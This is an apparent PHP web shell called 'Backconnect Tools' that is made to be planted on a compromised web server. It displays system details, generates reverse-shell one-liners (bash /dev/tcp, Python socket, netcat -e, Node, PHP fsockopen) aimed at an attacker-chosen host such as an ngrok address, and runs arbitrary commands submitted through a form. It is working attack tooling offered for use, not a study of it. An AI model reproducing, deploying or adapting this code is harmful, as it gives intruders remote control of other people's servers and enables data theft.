<html>
	<head>
		<title>Backconnect Tools | GT72</title>
	<center>
<img height="300" src="https://img1.uploadhouse.com/fileuploads/26820/268209011e26a5d87536a57c1541bd7371577c68.jpg"/>
<h1>Backconnect Tools</h1>
<?php
/*
php coded by DarkOct02
Copyright 2021 magelang1337
*/
function execute($cmd) { 
  if(function_exists('system')) { 
    @ob_start();
    @system($cmd);
    $result = @ob_get_contents();
    @ob_end_clean();
  }elseif(function_exists('passhtru')) { 
    @ob_start();
    passhtru($cmd);
    $result = ob_get_contents();
    ob_end_clean();
  }elseif(function_exists('shell_exec')) { 
     $result = @shell_exec($cmd);
  }
  return $result;   
}
if(@ini_get("disable_functions") == ''){ 
  $dis = '<font color="black">None</font>';
}else{
  $dis = @ini_get('disable_functions');
}
$uname = "<br><font color='black' size='3'>".php_uname()."</font>";
echo "$uname"; 
echo "<br>Disable function: $dis";
echo '<form method="POST" value=""><font color="green"><center><select name="choose"><option value="bash">Bash</option><option value="python">Python</option><option value="netcat">Netcat</option><option value="php">Php</option><option value="node">Nodejs</option>
       <font color="green"><input type="text" name="host" value="0.tcp.ngrok.io" style="margin-left:7px;"><input type="text" name="port" value="80800" style="width:90px;margin-left:2px;"><input type="submit" name="back" value="back">';
  if($_POST['back']) { 
    if($_POST['choose'] == 'bash') { 
      $command = 'bash -i >& /dev/tcp/'.$_POST['host'].'/'.$_POST['port'].' 0>&1';
      execute($command);
    
    }elseif($_POST['choose'] == 'python') { 
      $command = 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'.$_POST['host'].'",'.$_POST['port'].'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'';
      execute($command);
    }elseif($_POST['choose'] == 'netcat') { 
      $command = 'nc -e /bin/sh '.$_POST['host'].' '.$_POST['port'];
      execute($command);
    }elseif($_POST['choose'] == 'node') {
    	$command = "require('child_process').exec('bash -i >& /dev/tcp/".$_POST['host']."/".$_POST['port']." 0>&1')";
    	execute($command);
    }elseif($_POST['choose'] == 'php') { 
      $command = 'php -r \'$sock=fsockopen("'.$_POST['host'].'",1234);exec("/bin/sh -i <&3 >&3 2>&3");\'';
      execute($command);
    }  
 }
echo '<center><form method="POST"><input type="text" name="com" value="command">
  <input type="submit" name="run"> ';
  if($_POST['run']) { 
    echo "<pre><font color='red'>".execute($_POST['com']);
}
echo "<br><br>Copyright &copy; ".date("Y")." - <a href='https://magelang1337.com/ target='_blank'><font color=#18BC9C>magelang1337";
?>
	</center>
   </head>
</html>
